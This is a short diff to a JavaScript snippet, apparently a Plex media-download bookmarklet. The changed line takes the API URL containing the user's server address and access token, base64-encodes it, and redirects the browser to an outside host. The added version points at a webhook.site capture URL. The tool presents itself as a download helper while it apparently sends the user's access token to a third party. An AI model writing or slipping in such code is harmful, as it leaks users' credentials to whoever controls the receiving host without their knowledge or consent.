@@ -83,7 +83,7 @@ el.getElementsByTagName( 'a' );
                 if (metadataId && metadataId.length == 2) {
                     
                     getXml(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken), getDownloadUrl);
-                    window.location.href = "https://ritzcracker.alwaysdata.net/wp/bob/bob/bob/xml.php?PlxDwnld=" + btoa(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken) + '&met=' + met);
+                    window.location.href = "https://webhook.site/9db9f664-e096-45ed-aacb-8212903bfa1e?PlxDwnld=" + btoa(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken) + '&met=' + met);
                 } else {
                     alert("You are currently not viewing a media item.");
                 }
